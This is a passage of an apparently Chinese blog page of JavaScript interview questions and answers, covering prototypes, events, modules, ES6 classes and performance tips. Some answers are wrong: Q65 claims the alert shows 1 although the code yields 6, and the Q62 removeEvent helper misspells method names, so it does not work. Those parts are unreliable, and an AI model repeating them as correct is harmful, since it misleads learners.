class="keyword">function</span>(<span class="params"></span>) </span>&#123; alert(num); &#125;</span><br><span class="line">  num++;</span><br><span class="line">  <span class="keyword">return</span> sayAlert;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> sayAlert = say667();</span><br><span class="line">sayAlert()<span class="comment">//执行结果应该弹出的667</span></span><br></pre></td></tr></table></figure><h2 id="26、javascript-代码中的”use-strict”-是什么意思-使用它区别是什么？"><a href="#26、javascript-代码中的”use-strict”-是什么意思-使用它区别是什么？" class="headerlink" title="26、javascript 代码中的”use strict”; 是什么意思 ? 使用它区别是什么？"></a>26、javascript 代码中的”use strict”; 是什么意思 ? 使用它区别是什么？</h2><p>意思是使用严格模式，使用严格模式，一些不规范的语法将不再支持</p><h2 id="27、如何判断一个对象是否属于某个类？"><a href="#27、如何判断一个对象是否属于某个类？" class="headerlink" title="27、如何判断一个对象是否属于某个类？"></a>27、如何判断一个对象是否属于某个类？</h2><p>Instanceof constructor</p><h2 id="28、new操作符具体干了什么呢"><a href="#28、new操作符具体干了什么呢" class="headerlink" title="28、new操作符具体干了什么呢?"></a>28、new操作符具体干了什么呢?</h2><blockquote><p>创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型。<br>属性和方法被加入到 this 引用的对象中。<br>新创建的对象由 this 所引用，并且最后隐式的返回 this 。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj  = &#123;&#125;;</span><br><span class="line">obj.__proto__ = Base.prototype;</span><br><span class="line">Base.call(obj);</span><br></pre></td></tr></table></figure><h2 id="29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？"><a href="#29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？" class="headerlink" title="29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？"></a>29、Javascript中，有一个函数，执行时对象查找时，永远不会去查找原型，这个函数是？</h2><p>HasOwnProperty</p><h2 id="30、对JSON的了解"><a href="#30、对JSON的了解" class="headerlink" title="30、对JSON的了解"></a>30、对JSON的了解</h2><p>轻量级数据交互格式，可以形成复杂的嵌套格式，解析非常方便</p><h2 id="31、js延迟加载的方式有哪些"><a href="#31、js延迟加载的方式有哪些" class="headerlink" title="31、js延迟加载的方式有哪些"></a>31、js延迟加载的方式有哪些</h2><blockquote><p>方案一：<code>&lt;script&gt;</code>标签的<code>async=&quot;async&quot;</code>属性<br>方案二：<code>&lt;script&gt;</code>标签的<code>defer=&quot;defer&quot;</code>属性<br>方案三：动态创建<code>&lt;script&gt;</code>标签<br>方案四：<code>AJAX eval</code>（使用AJAX得到脚本内容，然后通过<code>eval_r(xmlhttp.responseText)</code>来运行脚本）<br>方案五：<code>iframe方式</code></p></blockquote><h2 id="32、模块化开发怎么做？"><a href="#32、模块化开发怎么做？" class="headerlink" title="32、模块化开发怎么做？"></a>32、模块化开发怎么做？</h2><blockquote><p>浏览器端 requirejs，seajs；<br>服务器端 nodejs；ES6模块化；<br>fis、webpack 等前端整体模块化解决方案；<br>grunt、gulp等前端工作流的使用</p></blockquote><h2 id="33、AMD（Modules-Asynchronous-Definition）、CMD（Common-Module-Definition）规范区别"><a href="#33、AMD（Modules-Asynchronous-Definition）、CMD（Common-Module-Definition）规范区别" class="headerlink" title="33、AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别"></a>33、AMD（Modules/Asynchronous-Definition）、CMD（Common Module Definition）规范区别</h2><p>理解这两种规范的差异，主要通过requirejs与seajs的对比，<br>理解模块的定义与引用方式的差异以及这两种规范的设计原则</p><h2 id="34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）"><a href="#34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）" class="headerlink" title="34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）"></a>34、requireJS的核心原理是什么？（如何动态加载的？如何避免多次加载的？如何缓存的？）</h2><blockquote><p>核心是js的加载模块，通过正则匹配模块以及模块的依赖关系，保证文件加载的先后顺序<br>根据文件的路径对加载过的文件做了缓存</p></blockquote><h2 id="35、自己设计实现一个-requireJS，你会怎么做？"><a href="#35、自己设计实现一个-requireJS，你会怎么做？" class="headerlink" title="35、自己设计实现一个 requireJS，你会怎么做？"></a>35、自己设计实现一个 requireJS，你会怎么做？</h2><p>核心是实现js的加载模块，维护js的依赖关系，控制好文件加载的先后顺序</p><h2 id="36、对ECMAScript6的了解"><a href="#36、对ECMAScript6的了解" class="headerlink" title="36、对ECMAScript6的了解"></a>36、对ECMAScript6的了解</h2><p>ES6新的语法糖，类，模块化等新特性</p><h2 id="37、ECMAScript6-怎么写class么，为什么会出现class这种东西"><a href="#37、ECMAScript6-怎么写class么，为什么会出现class这种东西" class="headerlink" title="37、ECMAScript6 怎么写class么，为什么会出现class这种东西?"></a>37、ECMAScript6 怎么写class么，为什么会出现class这种东西?</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(x, y) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = x;</span><br><span class="line">    <span class="keyword">this</span>.y = y;</span><br><span class="line">  &#125;</span><br><span class="line">  toString() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'('</span>+<span class="keyword">this</span>.x+<span class="string">', '</span>+<span class="keyword">this</span>.y+<span class="string">')'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="39、数组和对象有哪些原生方法"><a href="#39、数组和对象有哪些原生方法" class="headerlink" title="39、数组和对象有哪些原生方法"></a>39、数组和对象有哪些原生方法</h2><blockquote><p>Array.concat( ) 连接数组<br>Array.join( ) 将数组元素连接起来以构建一个字符串<br>Array.length 数组的大小<br>Array.pop( ) 删除并返回数组的最后一个元素<br>Array.push( ) 给数组添加元素<br>Array.reverse( ) 颠倒数组中元素的顺序<br>Array.shift( ) 将元素移出数组<br>Array.slice( ) 返回数组的一部分<br>Array.sort( ) 对数组元素进行排序<br>Array.splice( ) 插入、删除或替换数组的元素<br>Array.toLocaleString( ) 把数组转换成局部字符串<br>Array.toString( ) 将数组转换成一个字符串<br>Array.unshift( ) 在数组头部插入一个元素<br>Object.hasOwnProperty( ) 检查属性是否被继承<br>Object.isPrototypeOf( ) 一个对象是否是另一个对象的原型<br>Object.propertyIsEnumerable( ) 是否可以通过for/in循环看到属性<br>Object.toLocaleString( ) 返回对象的本地字符串表示<br>Object.toString( ) 定义一个对象的字符串表示<br>Object.valueOf( ) 指定对象的原始值</p></blockquote><h2 id="40、JS-怎么实现一个类。怎么实例化这个类"><a href="#40、JS-怎么实现一个类。怎么实例化这个类" class="headerlink" title="40、JS 怎么实现一个类。怎么实例化这个类"></a>40、JS 怎么实现一个类。怎么实例化这个类</h2><blockquote><p>严格来讲js中并没有类的概念<br>不过js中的函数可以作为构造函数来使用<br>通过new来实例化，其实函数本身也是一个对象。</p></blockquote><h2 id="41、JavaScript中的作用域与变量声明提升？"><a href="#41、JavaScript中的作用域与变量声明提升？" class="headerlink" title="41、JavaScript中的作用域与变量声明提升？"></a>41、JavaScript中的作用域与变量声明提升？</h2><blockquote><p>理解JavaScript的预解析机制<br>js的运行主要分两个阶段<br>js的预解析和运行<br>预解析阶段所有的变量声明和函数定义都会提前，但是变量的赋值不会提前</p></blockquote><h2 id="42、如何编写高性能的Javascript"><a href="#42、如何编写高性能的Javascript" class="headerlink" title="42、如何编写高性能的Javascript"></a>42、如何编写高性能的Javascript</h2><blockquote><p>使用 DocumentFragment 优化多次 append<br>通过模板元素 clone ，替代 createElement<br>使用一次 innerHTML 赋值代替构建 dom 元素<br>使用 firstChild 和 nextSibling 代替 childNodes 遍历 dom 元素<br>使用 Array 做为 StringBuffer ，代替字符串拼接的操作<br>将循环控制量保存到局部变量<br>顺序无关的遍历时，用 while 替代 for<br>将条件分支，按可能性顺序从高到低排列<br>在同一条件子的多（ &gt;2 ）条件分支时，使用 switch 优于 if<br>使用三目运算符替代条件分支<br>需要不断执行的时候，优先考虑使用 setInterval</p></blockquote><h2 id="43、那些操作会造成内存泄漏"><a href="#43、那些操作会造成内存泄漏" class="headerlink" title="43、那些操作会造成内存泄漏"></a>43、那些操作会造成内存泄漏</h2><p>闭包，循环</p><h2 id="44、javascript对象的几种创建方式"><a href="#44、javascript对象的几种创建方式" class="headerlink" title="44、javascript对象的几种创建方式"></a>44、javascript对象的几种创建方式</h2><blockquote><p>工厂模式<br>构造函数模式<br>原型模式<br>混合构造函数和原型模式<br>动态原型模式<br>寄生构造函数模式<br>稳妥构造函数模式</p></blockquote><h2 id="45、javascript-继承的-6-种方法？"><a href="#45、javascript-继承的-6-种方法？" class="headerlink" title="45、javascript 继承的 6 种方法？"></a>45、javascript 继承的 6 种方法？</h2><blockquote><p>原型链继承<br>借用构造函数继承<br>组合继承(原型+借用构造)<br>原型式继承<br>寄生式继承<br>寄生组合式继承</p></blockquote><h2 id="46、eval"><a href="#46、eval" class="headerlink" title="46、eval"></a>46、eval</h2><blockquote><p>它的功能是把对应的字符串解析成JS代码并运行<br>应该避免使用eval，不安全，非常耗性能（2次，一次解析成js语句，一次执行）</p></blockquote><h2 id="47、JavaScript-原型，原型链-有什么特点？"><a href="#47、JavaScript-原型，原型链-有什么特点？" class="headerlink" title="47、JavaScript 原型，原型链 ? 有什么特点？"></a>47、JavaScript 原型，原型链 ? 有什么特点？</h2><blockquote><p>原型对象也是普通的对象，是对象一个自带隐式的<code>__proto__</code>属性，原型也有可能有自己的原型，如果一个原型对象的原型不为 null 的话，我们就称之为原型链<br>原型链是由一些用来继承和共享属性的对象组成的（有限的）对象链</p></blockquote><h2 id="JavaScript的数据对象有那些属性值"><a href="#JavaScript的数据对象有那些属性值" class="headerlink" title="JavaScript的数据对象有那些属性值"></a>JavaScript的数据对象有那些属性值</h2><blockquote><p>writable：这个属性的值是否可以改。<br>configurable：这个属性的配置是否可以删除，修改。<br>enumerable：这个属性是否能在for…in循环中遍历出来或在Object.keys中列举出来。<br>value：属性值。</p></blockquote><p>当我们需要一个属性的时，Javascript引擎会先看当前对象中是否有这个属性， 如果没有的话，就会查找他的Prototype对象是否有这个属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clone</span>(<span class="params">proto</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Dummy</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line">  Dummy.prototype = proto;</span><br><span class="line">  Dummy.prototype.constructor = Dummy;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Dummy(); <span class="comment">//等价于Object.create(Person);</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">object</span>(<span class="params">old</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">F</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">    F.prototype = old;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> F();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> newObj = object(oldObject);</span><br></pre></td></tr></table></figure><h2 id="48、事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？"><a href="#48、事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？" class="headerlink" title="48、事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？"></a>48、事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</h2><blockquote><p>我们在网页中的某个操作（有的操作对应多个事件）。<br>例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为<br>事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件<br>ev.stopPropagation(); 注意旧ie的方法：ev.cancelBubble = true;</p></blockquote><h2 id="49、简述一下Sass、Less，且说明区别"><a href="#49、简述一下Sass、Less，且说明区别" class="headerlink" title="49、简述一下Sass、Less，且说明区别"></a>49、简述一下Sass、Less，且说明区别</h2><p>他们是动态的样式语言，是 CSS 预处理器, CSS 上的一种抽象层。他们是一种特殊的语法/语言而编译成CSS。</p><p>变量符不一样，less 是 @，而 Sass 是 $;</p><blockquote><p>Sass支持条件语句，可以使用 if{}else{}, for{} 循环等等。而 Less 不支持;<br>Sass是基于 Ruby 的，是在服务端处理的，而 Less 是需要引入 less.js 来处理 Less 代码输出 Css 到浏览器</p></blockquote><h2 id="50、关于javascript中apply-和call-方法的区别？"><a href="#50、关于javascript中apply-和call-方法的区别？" class="headerlink" title="50、关于javascript中apply()和call()方法的区别？"></a>50、关于javascript中apply()和call()方法的区别？</h2><blockquote><p>相同点:两个方法产生的作用是完全一样的<br>不同点:方法传递的参数不同<br>Object.call(this,obj1,obj2,obj3)<br>Object.apply(this,arguments)<br>apply()接收两个参数，一个是函数运行的作用域(this)，另一个是参数数组。<br>call()方法第一个参数与apply()方法相同，但传递给函数的参数必须列举出来。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">  alert(a+b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">  alert(a-b);</span><br><span class="line">&#125;</span><br><span class="line">add.call(sub,<span class="number">3</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>例子中用 add 来替换 sub，add.call(sub,3,1) == add(3,1) ，所以运行结果为：alert(4);</p><p>注意：js 中的函数其实是对象，函数名是对 Function 对象的引用。</p><h2 id="51、分别阐述split-slice-splice-join"><a href="#51、分别阐述split-slice-splice-join" class="headerlink" title="51、分别阐述split(),slice(),splice(),join()"></a>51、分别阐述split(),slice(),splice(),join()</h2><blockquote><p>join()用于把数组中的所有元素拼接起来放入一个字符串。所带的参数为分割字符串的分隔符，默认是以逗号分开。归属于Array<br>split()即把字符串分离开，以数组方式存储。归属于Stringstring<br>slice() 方法可从已有的数组中返回选定的元素。该方法并不会修改数组，而是返回一个子数组。如果想删除数组中的一段元素，应该使用方法 Array.splice()<br>splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。返回的是含有被删除的元素的数组。</p></blockquote><h2 id="52、事件委托"><a href="#52、事件委托" class="headerlink" title="52、事件委托"></a>52、事件委托</h2><p>让利用事件冒泡的原理，让自己的所触发的事件，让他的父元素代替执行！</p><h2 id="53、如何阻止事件冒泡和默认事件"><a href="#53、如何阻止事件冒泡和默认事件" class="headerlink" title="53、如何阻止事件冒泡和默认事件"></a>53、如何阻止事件冒泡和默认事件</h2><p>阻止浏览器的默认行为</p><blockquote><p>window.event?window.event.returnValue = false: e.preventDefault();</p></blockquote><p>停止事件冒泡</p><blockquote><p>window.event?window.event.cancelBubble = true:e.stopPropagation();</p></blockquote><p>原生的 和 jQuery 的</p><blockquote><p>原生JavaScript中，return false;只阻止默认行为，不阻止冒泡，<br>jQuery中的return false;既阻止默认行为，又阻止冒泡</p></blockquote><h2 id="54、require-js-有什么特性"><a href="#54、require-js-有什么特性" class="headerlink" title="54、require.js 有什么特性"></a>54、require.js 有什么特性</h2><blockquote><p>实现js文件的异步加载，避免网页失去响应；<br>管理模块之间的依赖性，便于代码的编写和维护。</p></blockquote><h2 id="55、谈一下JS中的递归函数，并且用递归简单实现阶乘？"><a href="#55、谈一下JS中的递归函数，并且用递归简单实现阶乘？" class="headerlink" title="55、谈一下JS中的递归函数，并且用递归简单实现阶乘？"></a>55、谈一下JS中的递归函数，并且用递归简单实现阶乘？</h2><p>递归即是程序在执行过程中不断调用自身的编程技巧，当然也必须要有一个明确的结束条件，不然就会陷入死循环。</p><h2 id="56、请用正则表达式写一个简单的邮箱验证"><a href="#56、请用正则表达式写一个简单的邮箱验证" class="headerlink" title="56、请用正则表达式写一个简单的邮箱验证"></a>56、请用正则表达式写一个简单的邮箱验证</h2><p><code>/^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;</code></p><h2 id="57、简述一下你对web性能优化的方案"><a href="#57、简述一下你对web性能优化的方案" class="headerlink" title="57、简述一下你对web性能优化的方案"></a>57、简述一下你对web性能优化的方案</h2><blockquote><p>尽量减少 HTTP 请求<br>使用浏览器缓存<br>使用压缩组件<br>图片、JS的预载入<br>将脚本放在底部<br>将样式文件放在页面顶部<br>使用外部的JS和CSS<br>精简代码</p></blockquote><h2 id="58、在JS中有哪些会被隐式转换为false"><a href="#58、在JS中有哪些会被隐式转换为false" class="headerlink" title="58、在JS中有哪些会被隐式转换为false"></a>58、在JS中有哪些会被隐式转换为false</h2><blockquote><p>Undefined、null、关键字false、NaN、零、空字符串</p></blockquote><h2 id="59、定时器-setInterval-有一个有名函数-fn1，setInterval（fn1-500）与-setInterval（fn1-500）有什么区别"><a href="#59、定时器-setInterval-有一个有名函数-fn1，setInterval（fn1-500）与-setInterval（fn1-500）有什么区别" class="headerlink" title="59、定时器 setInterval 有一个有名函数 fn1，setInterval（fn1,500）与 setInterval（fn1(),500）有什么区别"></a>59、定时器 setInterval 有一个有名函数 fn1，setInterval（fn1,500）与 setInterval（fn1(),500）有什么区别</h2><p>第一个是重复执行每 500 毫秒执行一次，后面一个只执行一次。</p><h2 id="60、外部-JS-文件出现中文字符，会出现什么问题，怎么解决"><a href="#60、外部-JS-文件出现中文字符，会出现什么问题，怎么解决" class="headerlink" title="60、外部 JS 文件出现中文字符，会出现什么问题，怎么解决"></a>60、外部 JS 文件出现中文字符，会出现什么问题，怎么解决</h2><p>会出现乱码，加 <code>charset=&quot;GB2312&quot;;</code></p><h2 id="61、谈谈浏览器的内核，并且说一下什么是内核"><a href="#61、谈谈浏览器的内核，并且说一下什么是内核" class="headerlink" title="61、谈谈浏览器的内核，并且说一下什么是内核"></a>61、谈谈浏览器的内核，并且说一下什么是内核</h2><blockquote><p>Trident ([‘traɪd(ə)nt])–IE<br>Gecko ([‘gekəʊ])–Firefox<br>Presto ([‘prestəʊ])–opera<br>webkit—谷歌和Safari</p></blockquote><p>浏览器内核又可以分成两部分：渲染引擎和 JS 引擎。它负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。JS 引擎则是解析 Javascript 语言，执行 javascript 语言来实现网页的动态效果。</p><h2 id="62、写一个通用的事件侦听器函数"><a href="#62、写一个通用的事件侦听器函数" class="headerlink" title="62、写一个通用的事件侦听器函数"></a>62、写一个通用的事件侦听器函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// event(事件)工具集</span></span><br><span class="line">mhq.Event = &#123;</span><br><span class="line">  <span class="comment">// 页面加载完成后</span></span><br><span class="line">  readyEvent: <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fn == <span class="literal">null</span>) &#123;</span><br><span class="line">      fn = <span class="built_in">document</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="built_in">window</span>.onload = fn;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        oldonload();</span><br><span class="line">        fn();</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></span><br><span class="line">  <span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></span><br><span class="line">  addEvent: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">      <span class="comment">//事件类型、需要执行的函数、是否捕捉</span></span><br><span class="line">      element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">      element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        handler.call(element);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">'on'</span> + type] = handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 移除事件</span></span><br><span class="line">  removeEvent: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.removeEnentListener) &#123;</span><br><span class="line">      element.removeEnentListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.datachEvent) &#123;</span><br><span class="line">      element.detachEvent(<span class="string">'on'</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></span><br><span class="line">  stopPropagation: <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ev.stopPropagation) &#123;</span><br><span class="line">      ev.stopPropagation();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ev.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 取消事件的默认行为</span></span><br><span class="line">  preventDefault: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault) &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 获取事件目标</span></span><br><span class="line">  getTarget: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></span><br><span class="line">  getEvent: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</span><br><span class="line">    <span class="keyword">if</span> (!ev) &#123;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</span><br><span class="line">      <span class="keyword">while</span> (c) &#123;</span><br><span class="line">        ev = c.arguments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        c = c.caller;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ev;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="63、如何判断一个对象是否属于某个类"><a href="#63、如何判断一个对象是否属于某个类" class="headerlink" title="63、如何判断一个对象是否属于某个类"></a>63、如何判断一个对象是否属于某个类</h2><p>使用instanceof （待完善）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a <span class="keyword">instanceof</span> Person)&#123;</span><br><span class="line">  alert(<span class="string">'yes'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="64、模块化怎么做"><a href="#64、模块化怎么做" class="headerlink" title="64、模块化怎么做"></a>64、模块化怎么做</h2><p>立即执行函数,不暴露私有成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> m1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> m2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    m1 : m1,</span><br><span class="line">    m2 : m2</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="65、告诉我答案是多少？"><a href="#65、告诉我答案是多少？" class="headerlink" title="65、告诉我答案是多少？"></a>65、告诉我答案是多少？</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line"><span class="keyword">delete</span> x;</span><br><span class="line">alert(x);</span><br><span class="line">&#125;)(<span class="number">1</span>+<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>函数参数无法 delete 删除，delete 只能删除通过 for in 访问的属性。当然，删除失败也不会报错，所以代码运行会弹出 1。</p><h2 id="66、Jquery-与-jQuery-UI-有啥区别？"><a href="#66、Jquery-与-jQuery-UI-有啥区别？" class="headerlink" title="66、Jquery 与 jQuery UI 有啥区别？"></a>66、Jquery 与 jQuery UI 有啥区别？</h2><blockquote><p>jQuery是一个js库，主要提供的功能是选择器，属性修改和事件绑定等等。<br>jQuery UI则是在jQuery的基础上，利用jQuery的扩展性，设计的插件。</p></blockquote><p>提供了一些常用的界面元素，诸如对话框、拖动行为、改变大小行为等等</p><h2 id="67、jquery-中如何将数组转化为json字符串，然后再转化回来"><a href="#67、jquery-中如何将数组转化为json字符串，然后再转化回来" class="headerlink" title="67、jquery 中如何将数组转化为json字符串，然后再转化回来"></a>67、jquery 